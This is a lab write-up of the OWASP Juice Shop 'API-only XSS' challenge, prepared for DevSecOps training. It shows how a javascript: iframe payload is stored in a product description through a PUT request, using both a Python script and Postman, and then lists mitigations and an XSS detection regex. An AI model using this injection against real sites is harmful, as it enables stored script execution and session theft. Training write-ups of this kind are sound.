# API-only XSS - ⭐⭐⭐

## Overview

**Category:** Cross-Site Scripting (XSS) / Persistent XSS  
**Difficulty:** ⭐⭐⭐ (3/6)  
**OWASP Top 10:** A03:2021 – Injection

### Brief Description
This challenge demonstrates how persistent XSS (Cross-Site Scripting) can be injected through API endpoints. By using a PUT request to update a product's description field with an XSS payload, the malicious script is stored persistently in the database. When users view the product in the application, the XSS payload executes automatically, demonstrating the danger of insufficient input validation and output encoding in API endpoints.

---

## Security Vulnerability Explained

### What is Persistent XSS?
Persistent XSS (also known as Stored XSS) is a type of Cross-Site Scripting attack where malicious scripts are permanently stored on the target server, typically in a database. Unlike reflected XSS, which only executes when a specific request is made, persistent XSS payloads are stored and executed every time the affected content is viewed. This makes persistent XSS particularly dangerous because it can affect multiple users over an extended period without requiring the attacker to craft specific requests for each victim.

### Dangers and Risks
Persistent XSS attacks pose severe security risks:

- **Session Hijacking:** Attackers can steal session cookies and authentication tokens, gaining unauthorized access to user accounts.
- **Account Takeover:** Stolen credentials can lead to complete account compromise and unauthorized actions.
- **Malware Distribution:** XSS payloads can redirect users to malicious websites or download malware.
- **Data Theft:** Attackers can exfiltrate sensitive user data, including personal information, payment details, and private messages.
- **Phishing Attacks:** XSS can be used to inject fake login forms that steal user credentials.
- **Business Consequences:**
  - Complete user account compromise
  - Data breaches and regulatory fines (GDPR, CCPA)
  - Loss of customer trust and reputation damage
  - Legal liability for security failures
- **Real-world Examples:**
  - *2018 British Airways breach:* XSS vulnerabilities led to the theft of 380,000 payment card details
  - *2015 eBay XSS attack:* Persistent XSS affected millions of users
  - *Multiple CMS platforms:* XSS vulnerabilities have been exploited to deface websites and steal data

### Why This Matters
XSS remains one of the most common web application vulnerabilities, consistently ranking in the OWASP Top 10. Persistent XSS is particularly dangerous because it affects all users who view the compromised content, not just the user who triggered the attack. API endpoints that accept user input without proper validation and encoding are prime targets for XSS attacks. Understanding how to identify and exploit XSS vulnerabilities helps developers implement proper input validation, output encoding, and Content Security Policy (CSP) headers.

---

## Challenge Documentation

### Challenge Description
The "API-only XSS" challenge requires injecting a persistent XSS payload through the product API endpoint. By using a PUT request to update a product's description field with a malicious script (e.g., `<iframe src="javascript:alert(\`xss\`)">`), the payload is stored persistently in the database. When any user views the product in the Juice Shop application, the XSS payload executes automatically, demonstrating that the attack is persistent and not just runtime-based. This challenge highlights the importance of input validation and output encoding in API endpoints.

### Prerequisites
- [x] OWASP Juice Shop application running locally or remotely
- [x] Postman or similar API testing tool (optional)
- [x] Python 3 installed with `requests` library (for script-based approach)
- [x] Basic understanding of HTTP methods (GET, PUT)
- [x] Knowledge of XSS attack vectors and payloads
- [x] Understanding of JSON request/response formats

---

## Exploitation Steps

### Step 1: Reconnaissance
**Goal:** Identify the API endpoint and understand the product data structure.

**Actions:**
1. Open Postman or your preferred API testing tool
2. Send a GET request to retrieve all products:
   ```
   GET http://10.20.20.54:3000/api/products
   ```
3. Review the response to see all available products
4. Identify a target product (e.g., product ID 5 - "Lemon Juice 500ml")

**Observations:**
- The API endpoint `/api/products` returns a list of all products
- Each product has fields like `id`, `name`, `description`, `price`, etc.
- Products can be accessed individually by ID

---

### Step 2: Examine Product Structure
**Goal:** Retrieve a specific product to understand the exact data structure needed for the PUT request.

**Actions:**
1. Send a GET request to retrieve a specific product:
   ```
   GET http://10.20.20.54:3000/api/products/5
   ```
2. Examine the response structure:
   ```json
   {
       "status": "success",
       "data": {
           "id": 5,
           "name": "Lemon Juice (500ml)",
           "description": "Sour but full of vitamins.",
           "price": 2.99,
           ...
       }
   }
   ```
3. Note the exact structure of the product object

**Evidence:**
- The response includes a `data` object containing the product details
- The `description` field is where we'll inject the XSS payload
- The product structure shows all required fields for the PUT request

---

### Step 3: Prepare XSS Payload
**Goal:** Create the XSS payload to inject into the product description.

**Payload/Technique:**
The XSS payload to inject:
```html
<iframe src="javascript:alert(`xss`)">
```

This payload will execute JavaScript when the product description is rendered in the browser.

---

### Step 4: Exploitation - Method 1: Using Python Script
**Goal:** Use a Python script to automate the PUT request with the XSS payload.

**Execution:**
1. Use the provided Python script (`scripts/put_xss/put_xss.py`):
   ```bash
   python3 scripts/put_xss/put_xss.py -i 5 -x '<iframe src="javascript:alert(`xss`)">'
   ```

2. The script will:
   - Fetch the current product data
   - Update the description field with the XSS payload
   - Send a PUT request to update the product
   - Display the response

**Result:**
- ✅ Product updated successfully
- XSS payload is now stored in the database
- The payload is persistent and will execute whenever the product is viewed

---

### Step 4: Exploitation - Method 2: Using Postman
**Goal:** Manually send a PUT request using Postman.

**Execution:**
1. Open Postman and create a new request
2. Set the HTTP method to **PUT**
3. Set the URL to:
   ```
   PUT http://10.20.20.54:3000/api/products/5
   ```
4. Add the **Content-Type** header:
   ```
   Content-Type: application/json
   ```
5. In the request body, select "raw" and "JSON"
6. Enter the request body (without the `status` and `data` wrapper - just the product object):
   ```json
   {
       "id": 5,
       "name": "Lemon Juice (500ml)",
       "description": "<iframe src=\"javascript:alert(`xss`)\">",
       "price": 2.99,
       "deluxePrice": 1.99,
       "image": "lemon_juice.jpg",
       "createdAt": "2025-11-09T15:10:36.928Z",
       "updatedAt": "2025-11-09T15:10:36.928Z",
       "deletedAt": null
   }
   ```
   **Important:** The body should contain only the product object, not wrapped in `{"status": "success", "data": {...}}`

7. Click "Send"

**Result:**
- ✅ Product updated successfully (status 200)
- Response shows the updated product with the XSS payload in the description
- The payload is now persistently stored in the database

---

### Step 5: Verify XSS Execution
**Goal:** Confirm that the XSS payload executes when the product is viewed.

**Actions:**
1. Navigate to the Juice Shop application in a web browser
2. Go to the product page or product listing
3. Find the updated product (e.g., "Lemon Juice (500ml)")
4. View the product details

**Result:**
- ✅ The XSS payload executes automatically
- JavaScript alert appears: `xss`
- The description field shows the iframe tag in the HTML source
- The attack is persistent - it will execute every time any user views the product
- This confirms that the XSS is stored in the database, not just executed at runtime

---

## Video Demonstration

### 🎥 Loom Video
**Link:** [Loom Video](https://www.loom.com/share/5ba996113df349d68403768994bcc221)

**Video Contents:**
- Introduction to API-only XSS challenge (0:00 - 0:02)
  - Overview of persistent XSS through API
  - Goal: Inject XSS payload that executes automatically and is persistently stored
- Understanding persistent XSS (0:02 - 0:21)
  - Difference between runtime and persistent XSS
  - Payload is stored in database and executes on every view
- Using Postman for reconnaissance (0:21 - 0:32)
  - Opening Postman
  - Calling API endpoint to get all products
- Examining product structure (0:32 - 1:05)
  - Getting individual product (ID 5) to see the structure
  - Understanding the request body format needed
- Creating Python script (1:05 - 1:18)
  - Creating script that accepts product ID
  - Script automates the PUT request
- Understanding PUT method (1:18 - 1:30)
  - PUT method for updating database entries via API
- Manual Postman approach (1:30 - 1:45)
  - Preparing PUT request in Postman
  - Setting up the request body for product ID 5
- Configuring request (1:45 - 2:02)
  - Setting method to PUT
  - Adding Content-Type header: application/json
  - Formatting the JSON body correctly
- Executing the attack (2:02 - 2:20)
  - Sending the PUT request
  - Product updated successfully
  - Navigating to Juice Shop to verify
- Verifying XSS execution (2:20 - 2:40)
  - Viewing the product in the application
  - XSS alert executes automatically
  - Description shows the iframe tag
  - Confirming the payload is persistent

---

## Mitigation & Prevention

### How to Fix This Vulnerability

#### Developer Recommendations:

1. **Implement Input Validation**
   - Implementation: Validate and sanitize all user input, especially data that will be stored in the database.
   - Code example:
   ```javascript
   // ✅ SECURE - Input validation
   const validator = require('validator');
   const xss = require('xss');
   
   function sanitizeProductInput(product) {
     return {
       id: parseInt(product.id),
       name: validator.escape(product.name),
       description: xss(product.description), // Sanitize HTML/JavaScript
       price: parseFloat(product.price),
       // ... other fields
     };
   }
   
   app.put('/api/products/:id', authenticateAdmin, (req, res) => {
     const sanitized = sanitizeProductInput(req.body);
     // Update product...
   });
   ```

2. **Implement Output Encoding**
   - Implementation: Always encode output when rendering user-supplied data in HTML to prevent XSS execution.
   - Code example:
   ```javascript
   // ✅ SECURE - Output encoding
   const he = require('he'); // HTML entity encoder
   
   // In template/rendering
   function renderProduct(product) {
     return {
       ...product,
       description: he.encode(product.description) // Encode HTML entities
     };
   }
   ```

3. **Use Content Security Policy (CSP)**
   - Implementation: Implement CSP headers to prevent inline scripts and restrict script sources.
   - Code example:
   ```javascript
   // ✅ SECURE - Content Security Policy
   app.use((req, res, next) => {
     res.setHeader(
       'Content-Security-Policy',
       "default-src 'self'; script-src 'self'; object-src 'none';"
     );
     next();
   });
   ```

4. **Whitelist Allowed HTML Tags**
   - Implementation: If HTML is required, use a whitelist approach to allow only safe HTML tags and attributes.
   - Code example:
   ```javascript
   // ✅ SECURE - HTML whitelist
   const sanitizeHtml = require('sanitize-html');
   
   function sanitizeDescription(description) {
     return sanitizeHtml(description, {
       allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
       allowedAttributes: {}
     });
   }
   ```

5. **Implement API Input Validation Middleware**
   - Implementation: Use validation middleware to check all API inputs before processing.
   - Code example:
   ```javascript
   // ✅ SECURE - API validation
   const { body, validationResult } = require('express-validator');
   
   app.put('/api/products/:id', [
     body('description')
       .notEmpty()
       .custom((value) => {
         // Check for XSS patterns
         if (/<script|javascript:|onerror=|onload=/i.test(value)) {
           throw new Error('Potentially malicious content detected');
         }
         return true;
       })
   ], (req, res) => {
     const errors = validationResult(req);
     if (!errors.isEmpty()) {
       return res.status(400).json({ errors: errors.array() });
     }
     // Process request...
   });
   ```

6. **Use Parameterized Queries**
   - Implementation: Use parameterized queries or ORM methods to prevent injection attacks.
   - Code example:
   ```javascript
   // ✅ SECURE - Parameterized queries
   app.put('/api/products/:id', async (req, res) => {
     const { id } = req.params;
     const { description } = req.body;
     
     // Use parameterized query
     await db.query(
       'UPDATE products SET description = ? WHERE id = ?',
       [sanitizeHtml(description), id]
     );
   });
   ```

7. **Implement Rate Limiting**
   - Implementation: Limit the number of API requests to prevent automated attacks.
   - Code example:
   ```javascript
   // ✅ SECURE - Rate limiting
   const rateLimit = require('express-rate-limit');
   
   const apiLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
     max: 100 // Limit each IP to 100 requests per windowMs
   });
   
   app.use('/api/', apiLimiter);
   ```

#### Security Best Practices:
- Always validate and sanitize all user input on the server side
- Implement output encoding when rendering user-supplied data
- Use Content Security Policy (CSP) headers
- Whitelist allowed HTML tags and attributes if HTML is required
- Implement API authentication and authorization
- Use parameterized queries to prevent injection
- Implement rate limiting on API endpoints
- Log all API requests for security monitoring
- Regularly audit API endpoints for security vulnerabilities
- Use security testing tools to identify XSS vulnerabilities
- Educate developers about XSS attack vectors and prevention

---

## Tools Used

| Tool | Purpose | Version/Link |
|------|---------|--------------|
| Postman | API testing and request manipulation | [Postman](https://www.postman.com/) |
| Python 3 + requests | Scripting for automated API requests | [Python](https://www.python.org/) |
| Browser Developer Tools | Inspect HTML and verify XSS execution | Built-in |
| OWASP Juice Shop | Target application for testing | [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) |

---

## References & Further Reading

1. [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
2. [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
3. [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
4. [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
5. [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## Notes & Reflections

### What I Learned
This challenge demonstrated how persistent XSS can be injected through API endpoints without proper input validation. The attack was particularly effective because the payload was stored in the database and executed automatically every time the product was viewed, affecting all users. The experience highlighted the importance of implementing input validation, output encoding, and Content Security Policy headers. Understanding how to exploit XSS through APIs helps developers recognize the need for comprehensive security controls at every layer of the application.

### Challenges Faced
The main challenge was understanding the correct format for the PUT request body. Initially, it was unclear whether to include the `status` and `data` wrapper or just the product object itself. Through experimentation, it became clear that the API expects only the product object in the request body. Additionally, ensuring the Content-Type header was set correctly was crucial for the request to be processed properly.

### Additional Observations
- API endpoints are prime targets for XSS attacks if not properly secured
- Persistent XSS is more dangerous than reflected XSS because it affects all users
- Input validation must be implemented on the server side, not just client side
- Output encoding is essential when rendering user-supplied data
- Content Security Policy can significantly reduce the impact of XSS attacks
- The challenge emphasizes the need for defense in depth - multiple security layers

---

**⚠️ Disclaimer:** This documentation is created solely for educational purposes as part of a DevSecOps training program. All activities were performed in a controlled, legal environment (OWASP Juice Shop). Never attempt these techniques on systems you don't own or have explicit permission to test.

---

**Date Completed:** 2025-11-16  
**Author:** Uwe Wohlleber

